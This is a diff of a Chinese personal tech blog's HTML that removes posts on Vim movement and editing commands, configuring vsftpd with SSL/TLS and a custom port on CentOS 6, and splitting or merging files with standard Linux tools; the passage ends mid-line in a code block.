-<h4 id="移动到行首或者行尾"><a href="#移动到行首或者行尾" class="headerlink" title="移动到行首或者行尾"></a>移动到行首或者行尾</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">            ^</div><div class="line">    &lt;------------</div><div class="line">.....This is a line with example text</div><div class="line">&lt;----------------- ---------------&gt;</div><div class="line">            0                        $</div></pre></td></tr></table></figure>
-<p>“\$”命令还可接受一个计数, 就象其它的移动命令一样.但是移动到一行的行尾多于一次没有任何意义. 所以它的功能被赋予为移动到下一行的行尾. 如”1\$”会将光标移动到当前行行尾, “2\$”则会移动到下一行的行尾, 如此类推.</p>
-<p>####移动到指定字符 </p>
-<p>一个最有用的移动命令是单字符搜索命令. 命令”fx”在当前行上查找下一个字符x. 提示: “f”意为”find”.例如, 光标位于下行的开头, 假如你要移动到单词human中的字符h上去. 只要执行命令”fh”就可以了,命令”fy”会将光标定位于单词really的尾部.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">To err is human. To really foul up you need a computer.</div><div class="line">---------&gt;---------------&gt;</div><div class="line">       fh               fy</div></pre></td></tr></table></figure>
-<p>该命令可以带一个命令计数; 命令”3fl”会把光标定位于”foul” 的”l”上:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">To err is human. To really foul up you need a computer.</div><div class="line">               ---------------------&gt;</div><div class="line">                            3fl</div></pre></td></tr></table></figure>
-<p>F向左搜索</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">To err is human. To really foul up you need a computer.</div><div class="line">	      &lt;---------------------</div><div class="line">                               Fh</div></pre></td></tr></table></figure>
-<p>“tx”命令形同”fx”命令, 只不过它不是把光标停留在被搜索字符上, 而是在它之前的一个字符上. 提示: “t”意为”To”. 该命令的反方向版是”Tx”:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">To err is human. To really foul up you need a computer.</div><div class="line">                &lt;------------    -------------&gt;</div><div class="line">                          Th                  tn</div></pre></td></tr></table></figure>
-<p>这4个命令都可以用”;”来重复. 以”,”也是重复同样的命令, 但是方向与原命令的方向相反 1 . 无论如何, 这4个命令都不会使光标跑到其它行上去. 即使当前的句子还没有结束</p>
-<p>####匹配一个括号为目的的移动 </p>
-<p>这对方括号[]和花括号{}同样适用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">                  %</div><div class="line">             &lt;-----&gt;</div><div class="line">if (a == (b  *  c) / d)</div><div class="line">   &lt;----------------&gt;</div><div class="line">               %</div></pre></td></tr></table></figure>
-<h4 id="移动到指定行"><a href="#移动到指定行" class="headerlink" title="移动到指定行"></a>移动到指定行</h4><p>没有指定命令计数作为参数的话 3 , “G”会把光标定位到最后一行上.”gg”命令是跳转到第一行的快捷的方法. “1G”效果也是一样,但是敲起来就没那么顺手了.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">|    first line of a file     ^</div><div class="line">|    text text text text    |</div><div class="line">|    text text text text    |  gg</div><div class="line"> 7G  |    text text text text    |</div><div class="line">|    text text text text</div><div class="line">|    text text text text</div><div class="line">       V   text text text text    |</div><div class="line">     text text text text    |  G</div><div class="line">     text text text text    |</div><div class="line">             last line of a file     V</div></pre></td></tr></table></figure>
-<p>另一个移动到某行的方法是在命令”%”之前指定一个命令计数 1 . 比如”50%”将会把光标定位在文件的中间 2 . “90%”跳到接近文件尾的地方 3 .</p>
-<p>上面的这些命令都假设你只是想跳转到文件中的某一行上, 不管该行当前是否显示在屏幕上.但如果你只是想移动到目前显示在屏幕上的那些行呢? 下图展示了达到这一目标的几个命令:”H”意为Home, “M”为Middle, “L”为Last.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">		+---------------------------+</div><div class="line">H --&gt;        |  text sample text              |</div><div class="line">		|  sample text		        |</div><div class="line">		|  text sample text              |</div><div class="line">  		  |  sample text                     |</div><div class="line">M --&gt;       |  text sample text              |</div><div class="line">		|  sample text 		         |</div><div class="line">		|  text sample text	            |</div><div class="line">		|  sample text		        |</div><div class="line">L --&gt;         |  text sample text              |</div><div class="line">		+---------------------------+</div></pre></td></tr></table></figure>
-<p>Vim允许你在文本中定义你自己的标记. 命令”ma”将当前光标下的位置名之为标记”a”.从a到z一共可以使用26个自定义的标记. 定义后的标记在屏幕上也看不出来. 不过Vim在内部记录了它们所代表的位置.</p>
-<p>要跳转到一个你定义过的标记, 使用命令`{mark}, {mark}就是你定义的标记的名字.就象这样:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">`a</div></pre></td></tr></table></figure>
-<p>命令’mark(单引号, 或者叫呼应单引号)会使你跳转到mark所在行的行首.这与`mark略有不同, `mark会精准地把你带到你定义mark时所在的行和列.</p>
-<p>你可以移动到文件开始处并在此放置一个名为s(start)的标记:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ms</div></pre></td></tr></table></figure>
-<h4 id="修改历史光标跳转"><a href="#修改历史光标跳转" class="headerlink" title="修改历史光标跳转"></a>修改历史光标跳转</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Ctrl-O  前一个修改所在光标位置 </div><div class="line">Ctrl-I   后一个修改所在光标位置</div></pre></td></tr></table></figure>
-<h4 id="滚动"><a href="#滚动" class="headerlink" title="滚动"></a>滚动</h4><ul>
-<li>CTRL-U命令会使文本向下滚动半屏. 也可以想象为在显示文本的窗<br>口向上滚动了半屏. 不要担心这种容易混淆的解释, 不是只有你一个人<br>搞不清楚.</li>
-<li>CTRL-D命令将窗口向下移动半屏, 所以相当于文本向上滚动了半屏:</li>
-<li>“zz”命令 会把当前行置为屏幕正中央</li>
-<li>“zt”命令会把当前行置于屏幕顶端  </li>
-<li>“zb”则把当前行置于屏幕底端 </li>
-<li>一次滚动一行可以使用CTRL-E(向上滚动)和CTRL-Y(向下滚动)</li>
-</ul>
-<hr>
-<h3 id="2-删除"><a href="#2-删除" class="headerlink" title="2. 删除"></a>2. 删除</h3><h4 id="操作符命令和位移"><a href="#操作符命令和位移" class="headerlink" title="操作符命令和位移"></a>操作符命令和位移</h4><p>“4w”命令是向前移动4个word. 所以”d4w”命令是删除4个word.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">To err is human. To really foul up you need a computer.</div><div class="line">                            ------------------&gt;</div><div class="line">                                    d4w</div><div class="line">To err is human. you need a computer.</div></pre></td></tr></table></figure>
-<p>Vim只删除到位移命令之后光标的前一个位置. 这是因为Vim知道你并不是要删除下一个word的第一个字符. 如果你用”e”命令来移动到word的末尾, Vim也会假设你是要包括那最后一个字符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">To err is human. you need a computer.</div><div class="line">                           --------&gt;</div><div class="line">                               d2e</div><div class="line">To err is human. a computer.</div></pre></td></tr></table></figure></p>
-<p>删除到行尾</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">To err is human. a computer.</div><div class="line">                           ------------&gt;</div><div class="line">                               d$</div><div class="line">To err is human</div></pre></td></tr></table></figure>
-<p>删除换行符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令J</div></pre></td></tr></table></figure></p>
-<h4 id="改变文本"><a href="#改变文本" class="headerlink" title="改变文本"></a>改变文本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">To err is human</div><div class="line">     -------&gt;</div><div class="line">      c2wbe&lt;Esc&gt;</div><div class="line">To be human</div></pre></td></tr></table></figure>
-<p>快捷命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">x      代表dl(删除当前光标下的字符)</div><div class="line">X 	代表dh(删除当前光标左边的字符)</div><div class="line">D     代表d$(删除到行尾的内容)</div><div class="line">C 	代表c$(修改到行尾的内容)</div><div class="line">s 	代表cl(修改一个字符)</div><div class="line">S 	代表cc(修改一整行)</div></pre></td></tr></table></figure>
-<h4 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h4><p>单个替换</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">there is somerhing grong here</div><div class="line">rT                  rt       rw</div><div class="line">There is something wrong here</div></pre></td></tr></table></figure>
-<h4 id="重复改动"><a href="#重复改动" class="headerlink" title="重复改动"></a>重复改动</h4><p>“.”命令是Vim中一个简单而强大的命令. 它会重复上一次做出的改动. 例如, 假设你在编辑一个HTML文件, 想删除其中所有的\<b\>标签. 你把光标置于\<b\>的&lt;字符上然后命令”df&gt;”. 然后到\</b\>的&lt;上用”.”命令做同样的事. “.”命令会执行上一次所执行的更改命令( 此例中是”df&gt;”).要删除另一个标签, 同样把光标置于&lt;字符上然后执行”.”命令即可.</b\></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">                                       To &lt;B&gt;generate&lt;/B&gt; a table of &lt;B&gt;contents</div><div class="line">f&lt;           找到第一个 &lt;     ---&gt;</div><div class="line">df&gt;         删除到 &gt;处的内容   --&gt;</div><div class="line">f&lt;           找到下一个 &lt;                  ---------&gt;</div><div class="line">.              重复 df&gt;                                      ---&gt;</div><div class="line">f&lt;           找到下一个 &lt;                                    -------------&gt;</div><div class="line">.              重复 df&gt;                                                                --&gt;</div></pre></td></tr></table></figure>
-<p>把”four”改为”five”. 它在你的文件里多次出现. 你可以用以下命令来做出修改:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">/four&lt;Enter&gt;     找到第一个字符串&quot;four&quot;</div><div class="line">cwfive&lt;Esc&gt;      把它改为&quot;five&quot;</div><div class="line">n 	  		    找到下一个字符串&quot;four&quot;</div><div class="line">. 			   同样改为&quot;five&quot;</div><div class="line">n 		          继续找下一个</div><div class="line">. 			   做同样的修改</div><div class="line">			等等</div></pre></td></tr></table></figure>
-<p>如果光标位于一个单词的中间而你要删除这个单词, 通常你需要把光标移到该单词的开头然后用”dw”命令. 不过有一个更简单的办法:”daw”，同时也删除掉单词后的空格，若不打算删除单词后的空格，使用:”diw”</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">this is some example text.</div><div class="line">		    daw</div><div class="line">this is some text.</div></pre></td></tr></table></figure>
-<p>删除</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">x       删除当前光标下的字符(&quot;dl&quot;的快捷命令)</div><div class="line">X       删除当前光标之前的字符(&quot;dh&quot;的快捷命令)</div><div class="line">D      删除自当前光标至行尾的内容(&quot;d$&quot;的快捷命令)</div><div class="line">dw    删除自当前光标至下一个word的开头</div><div class="line">db     删除自当前光标至前一个word的开始</div><div class="line">diw    删除当前光标所在的word(不包括空白字符)</div><div class="line">daw   删除当前光标所在的word(包括空白字符)</div><div class="line">dG     删除当前行至文件尾的内容</div><div class="line">dgg   删除当前行至文件头的内容</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">~      改变当前光标下字符的大小写, 并将光标移至下一个字符. 这不是一个操作符命令(除非你设置了&apos;tildeop&apos;3 选项), 所以你不能让它与一个位移命令搭配使用. 但它可以在Visual模式下改变所有被选中的文本的大小写.</div><div class="line">I       将光标置于当前行第一个非空白字符处并进入Insert模式</div><div class="line">A     当光标置于当前行尾并进入Insert模式</div></pre></td></tr></table></figure>
-
-        
-      
-    </div>
-
-    
-  </article>
-
-    
-      
-  <article class="post">
-    <header class="post-header">
-      <h1 class="post-title">
-        
-          <a class="post-link" href="/2016/06/24/CentOS 6.x vsftp 启用 SSL或TLS/">CentOS 6.x vsftp 启用 SSL或TLS</a>
-        
-      </h1>
-
-      <div class="post-meta">
-        <span class="post-time">
-          2016年6月24日
-        </span>
-      </div>
-    </header>
-
-    
-
-    <div class="post-content">
-      
-        
-
-        
-          <h3 id="1-创建用户以及用户组"><a href="#1-创建用户以及用户组" class="headerlink" title="1. 创建用户以及用户组"></a>1. 创建用户以及用户组</h3><p>在CeotOS下建立一个单独的FTP账户，并不允许进行SSH登录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">useradd -s /sbin/nologin vxftp</div><div class="line">passwd vxftp</div></pre></td></tr></table></figure>
-<p>建立图床的文件夹，按照管理，将该目录放置在账户的home文件夹下，例如如下命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mkdir -p /home/vxftp/imgbed</div></pre></td></tr></table></figure>
-<p>创建一个单独的FTP用户组</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">groupadd vsftp</div></pre></td></tr></table></figure>
-<p>把之前建立的图床文件夹分配给FTP用户,并更改其用户组</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">usermod -g vsftp -d /home/vxftp/imgbed -U vxftp</div></pre></td></tr></table></figure>
-<p>更改文件夹属性</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chown -R vxftp.vsftp /home/vxftp/imgbed</div></pre></td></tr></table></figure>
-<hr>
-<h3 id="2-安装配置vsftp"><a href="#2-安装配置vsftp" class="headerlink" title="2.安装配置vsftp"></a>2.安装配置vsftp</h3><h4 id="不使用SSL-TLS配置"><a href="#不使用SSL-TLS配置" class="headerlink" title="不使用SSL/TLS配置"></a>不使用SSL/TLS配置</h4><p>安装vsftpd<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install -y vsftpd</div></pre></td></tr></table></figure></p>
-<p>修改vsftpd配置文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vi /etc/vsftpd/vsftpd.conf</div></pre></td></tr></table></figure>
-<p>检查一下是否正确</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">listen=YES</div><div class="line">local_enable=YES</div><div class="line">write_enable=YES</div><div class="line">local_umask=022</div><div class="line">pasv_promiscuous=YES</div></pre></td></tr></table></figure>
-<p>禁止其他用户访问FTP,若userlist_enable=YES，则/etc/vsftpd/user_list中的用户将被禁止访问FTP，如果为NO，则只有user_list里面的用户可以访问FTP。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">userlist_enable=NO</div><div class="line">anonymous_enable = NO</div></pre></td></tr></table></figure>
-<p>把vxftp用户加入到user_list中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo &quot;vxftp&quot; &gt;&gt; /etc/vsftpd/user_list</div></pre></td></tr></table></figure>
-<p>把之前创建的图床目录路径加入到chroot_list中，并修改配置文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">echo &quot;/home/vxftp/imgbed&quot; &gt;&gt; /etc/vsftpd/chroot_list</div><div class="line">echo &quot;chroot_list_enable=YES&quot;&gt;&gt;/etc/vsftpd/vsftpd.conf</div><div class="line">echo &quot;chroot_list_file=/etc/vsftpd/chroot_list&quot;&gt;&gt;/etc/vsftpd/vsftpd.conf</div></pre></td></tr></table></figure>
-<p>其中vsftpd服务并将其加入到开机自启动</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">service vsftpd start</div><div class="line">chkconfig --level 35 vsftpd on</div></pre></td></tr></table></figure>
-<p>在windows下打开任意一个文件夹窗口，输入如下地址</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ftp://ftp-server:11235</div></pre></td></tr></table></figure>
-<p>不使用SSL/TLS则可以不设置下面内容。</p>
-<h4 id="SSL-TLS加密配置"><a href="#SSL-TLS加密配置" class="headerlink" title="SSL/TLS加密配置"></a>SSL/TLS加密配置</h4><p>创建证书存放文件夹并生成证书</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cd /etc/vsftpd/</div><div class="line">mkdir ssl</div><div class="line">sudo openssl req -x509 -nodes -days 730 -newkey rsa:2048 -keyout /etc/vsftpd/ssl/vsftpd.pem -out /etc/vsftpd/ssl/vsftpd.pem</div></pre></td></tr></table></figure>
-<p>修改<code>/etc/vsftpd/vsftpd.conf</code>配置文件，如下所示</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">rsa_cert_file=/etc/vsftpd/ssl/vsftpd.pem           #证书路径</div><div class="line">ssl_enable=YES                                                   #是否启用 SSL,默认为no</div><div class="line">allow_anon_ssl=NO                                            #是否允许匿名用户使用SSL,默认为no</div><div class="line">force_local_data_ssl=YES                                    #非匿名用户传输数据时是否加密,默认为yes</div><div class="line">force_local_logins_ssl=YES                                  #非匿名用户登陆时是否加密,默认为yes</div><div class="line">ssl_tlsv1=YES                                                       #是否激活sslv1加密,默认no</div><div class="line">ssl_sslv2=NO                                                       #是否激活sslv2加密,默认no</div><div class="line">ssl_sslv3=NO                                                       #是否激活sslv3加密,默认no</div><div class="line">require_ssl_reuse=NO</div><div class="line">ssl_ciphers=HIGH</div></pre></td></tr></table></figure>
-<hr>
-<h3 id="3-修改FTP端口号"><a href="#3-修改FTP端口号" class="headerlink" title="3.修改FTP端口号"></a>3.修改FTP端口号</h3><p>默认FTP端口号可能有一些安全问题，可以把默认端口号改为其他端口号</p>
-<p>编辑/etc/vsftpd/vsftpd.conf文件，将预设端口号加入文件末尾，其中11235为修改后的端口号</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat &quot;listen_port=11235&quot; &gt;&gt; /etc/vsftpd/vsftpd.conf</div></pre></td></tr></table></figure>
-<p>编辑/etc/services 将其中的 ftp 21/tcp 改为 ftp 11235/tcp，ftp 21/udp 改为 ftp 11235/udp</p>
-<p>修改/etc/vsftpd/vsftpd.conf的配置文件，在文件末端添加如下，端口范围可以自己选定，这里选定的范围为2333到2343,vsftp会使用这个范围的端口号进行传输数据，如果在防火墙上不放行这个端口号范围，vsftp客户端可以登录，但是无法获取文件列表。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pasv_min_port=2333</div><div class="line">pasv_max_port=2343</div></pre></td></tr></table></figure>
-<p>防火墙中加入条目，然后保存并重启防火墙</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">iptables -I INPUT 1 -p tcp --dport 11235 -j ACCEPT</div><div class="line">iptables -I INPUT 1 -p udp --dport 11235 -j ACCEPT</div><div class="line">iptables -I INPUT 1 -p tcp --dport 2333:2343 -j ACCEPT</div><div class="line">service iptables save</div><div class="line">service iptabkes restart</div></pre></td></tr></table></figure>
-<p>重新启动vsftpd服务</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service vsftpd restart</div></pre></td></tr></table></figure>
-        
-      
-    </div>
-
-    
-  </article>
-
-    
-      
-  <article class="post">
-    <header class="post-header">
-      <h1 class="post-title">
-        
-          <a class="post-link" href="/2016/06/24/Linux 文件分割/">Linux文件分割</a>
-        
-      </h1>
-
-      <div class="post-meta">
-        <span class="post-time">
-          2016年6月24日
-        </span>
-      </div>
-    </header>
-
-    
-
-    <div class="post-content">
-      
-        
-
-        
-          <h3 id="1-两个文件的交集、并集"><a href="#1-两个文件的交集、并集" class="headerlink" title="1. 两个文件的交集、并集"></a>1. 两个文件的交集、并集</h3><p>前提条件：取出两个文件的并集(重复的行只保留一份)</p>
-<p>{0}. 取出两个文件的并集(重复的行只保留一份)<br>{0}. 取出两个文件的交集(只留下同时存在于两个文件中的文件)<br>{0}. 删除交集，留下其他的行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cat file1 file2 | sort | uniq &gt; file3</div><div class="line">cat file1 file2 | sort | uniq -d &gt; file3</div><div class="line">cat file1 file2 | sort | uniq -u &gt; file3</div></pre></td></tr></table></figure>
-<hr>
-<h3 id="2-两个文件合并"><a href="#2-两个文件合并" class="headerlink" title="2. 两个文件合并"></a>2. 两个文件合并</h3><p>一个文件在上，一个文件在下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat file1 file2 &gt; file3</div></pre></td></tr></table></figure>
-<p>一个文件在左，一个文件在右</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">paste file1 file2 &gt; file3</div></pre></td></tr></table></figure>
-<hr>
-<h3 id="3-去掉重复的行"><a href="#3-去掉重复的行" class="headerlink" title="3. 去掉重复的行"></a>3. 去掉重复的行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sort file | uniq</div></pre></td></tr></table></figure>
-<p>注意：重复的多行记为一行，也就是说这些重复的行还在，只是全部省略为一行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sort file | uniq -u</div></pre></td></tr></table></figure>
-<p>上面的命令可以把重复的行全部去掉，也就是文件中的非重复行。具体细节可以查看，cat，sort，uniq等命令的详细介绍</p>
-<hr>
-<h3 id="4-文件分割成多个小文件"><a href="#4-文件分割成多个小文件" class="headerlink" title="4. 文件分割成多个小文件"></a>4. 文件分割成多个小文件</h3><h4 id="split分割"><a href="#split分割" class="headerlink" title="split分割"></a>split分割</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">语法：split [-&lt;行数&gt;][-b &lt;字节&gt;][-C &lt;字节&gt;][-l &lt;行数&gt;][要切割的文件][输出文件名]</div><div class="line">gunzip log.txt.gz                                                                            #一定要先解压，否则分割的文件是不能cat/zcat显示；</div><div class="line">wc -l log.txt                                                                                   #计算一个文件的总行数；</div><div class="line">  </div><div class="line">split -l 120000 log.txt newlog                                                       #通过指定行数，将日志分割成两个文件；</div><div class="line">du -sh *50M     log.txt</div><div class="line"></div><div class="line"> file *                                                                                              #分割后的文件与原文件属性一样</div><div class="line">gzip newlogaa newlogab                                                              #将分割后的文件进行压缩，以便传输</div></pre></td></tr></table></figure>
-<h4 id="dd分割"><a href="#dd分割" class="headerlink" title="dd分割"></a>dd分割</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">gunzip log.txt.gz                                                                             #一定要先解压，否则分割的文件是不能cat/zcat显示</div><div class="line">dd bs=20480 count=1500 if=log.txt of=newlogaa                       #按大小分第一个文件</div><div class="line">dd bs=20480 count=1500 if=log.txt of=newlogab skip=1500     #将大小之后的生成另一个文件#file *</div></pre></td></tr></table></figure>
-<p>分割没问题，但会出现同一行分到不同文件的情况。</p>
-<h4 id="head-tail-分割"><a href="#head-tail-分割" class="headerlink" title="head+tail 分割"></a>head+tail 分割</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">gzip log.txt.gz                                                                                 #如不解压缩，下面请用zcat。</div><div class="line">wc -l log.txt                                                                                     #统计一个行数</div><div class="line">head -n `echo $((208363/2+1))` log.txt &gt; newloga.txt                   #前x行重定向输出到一个文件中；</div><div class="line">tail –n `echo $((208363-208362/2-1))` log.txt &gt;newlogb.txt          #后x行重定向输出到一个文件中；</div><div class="line">gzip newloga.txt newlogb.txt                                                         #将两个文件进行压缩</div></pre></td></tr></table></figure>
-<h4 id="awk分割"><a href="#awk分割" class="headerlink" title="awk分割"></a>awk分割</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"> gzip log.txt.gz</div><div class="line"> awk  &apos;&#123;if (NR&lt;120000) print $0&#125;&apos; log.txt &gt;newloga.txt</div><div class="line"> awk  &apos;&#123;if (NR&gt;=120000) print $0&#125;&apos; log.txt &gt;newlogb.txt</div><div class="line">#以上两个命令，都要遍历整个文件，所以考虑到效率，应使用合并成：</div><div class="line">awk  &apos;&#123;if (NR&lt;120000) print $0 &gt;&quot;newloga.txt&quot;; if (NR&gt;=120000) print $0&gt;&quot;newlogb.txt&quot;&#125;&apos; log.txt</div></pre></td></tr></table></figure>
-<p>以上四种方法，除了dd之外的三种方式都可以很好的整行分割日志文件。进行分割时，应考虑在读一次文件的同时完成，如不然，按下面的方式分割：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Cat log.txt | head –12000 &gt;newloga.txt</div><div class="line">Cat log.txt | tail –23000 &gt;newlogb.txt</div></pre></td></tr></table></figure>
-<p>如用此方法分割文件的后一部分，那么执行第二行命令文件时，前x行是白白读一遍的，执行的效率将很差，如文件过大，还可能出现内存不够的情况。</p>
-
-        
-      
-    </div>
-
-    
-  </article>
-
-    
-      
-  <article class="post">
-    <header class="post-header">
-      <h1 class="post-title">
-        
           <a class="post-link" href="/2016/06/19/Linux Bash环境变量/">Linux Bash 环境变量</a>
         
       </h1>
@@ -1105,17 +203,14 @@ ID          Interface   State Pri   Dead
     <div class="post-content">
       
         
+          
+        
 
         
-          <h3 id="1-书签"><a href="#1-书签" class="headerlink" title="1.书签"></a>1.书签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div 